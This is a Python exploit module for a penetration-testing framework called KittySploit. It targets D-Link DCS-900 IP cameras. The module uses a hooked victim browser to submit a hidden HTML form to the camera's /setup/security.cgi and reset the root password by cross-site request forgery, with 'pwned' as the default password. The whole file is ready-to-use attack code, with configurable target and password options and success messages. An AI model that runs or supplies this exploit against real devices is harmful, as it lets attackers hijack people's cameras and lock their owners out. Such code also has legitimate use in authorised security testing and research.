from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "D-Link DCS-900 CSRF",
		"description": "D-Link DCS-900 camera - Change root password via CSRF POST",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://192.168.1.1", "Target camera URL (with http://)", required=True)
	password = OptString("pwned", "New root password to set", required=True)

	def run(self):
		form_data = [
			f'<form method="POST" action="{self.target}/setup/security.cgi">',
			f'<input type="hidden" name="rootpass" value="{self.password}"/>',
			f'<input type="hidden" name="confirm" value="{self.password}"/>',
			'</form>'
		]
		
		print_info(f"Executing CSRF POST attack on: {self.target}")
		print_info(f"Target: {self.target}/setup/security.cgi")
		print_info(f"New root password: {self.password}")
		
		js_code = self.csrf_post_and_submit(form_data)
		result = self.send_js_and_wait_for_response(js_code, timeout=10.0)
		
		if result:
			print_success("CSRF POST attack executed successfully")
			print_info(f"Response: {result}")
			print_info("Root password change request sent")
			return True
		else:
			fail.CSRFPostFailed()
		return False
